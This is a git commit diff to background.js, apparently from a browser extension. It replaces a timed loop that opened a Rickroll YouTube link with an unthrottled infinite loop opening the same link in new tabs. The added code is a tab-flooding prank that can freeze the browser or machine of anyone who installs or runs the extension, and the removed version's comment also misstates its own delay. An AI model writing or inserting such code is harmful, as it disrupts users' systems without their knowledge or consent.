3b0d6ac5801ee94f4f44e4bbf94283fbee225772
AleksandrTheGreat21 <100033042@mvla.net>
2025-02-14 10:18:23 -0800

    Update background.js

--- background.js
+++ background.js
@@ -1,7 +1,3 @@
-let isRunning = true;
-async function openTabs() {
-    while (isRunning) {
-        window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank");
-        await new Promise(resolve => setTimeout(resolve, 1000)); // Opens every 2 seconds
-    }
+while (true) {
+    window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank");
 }
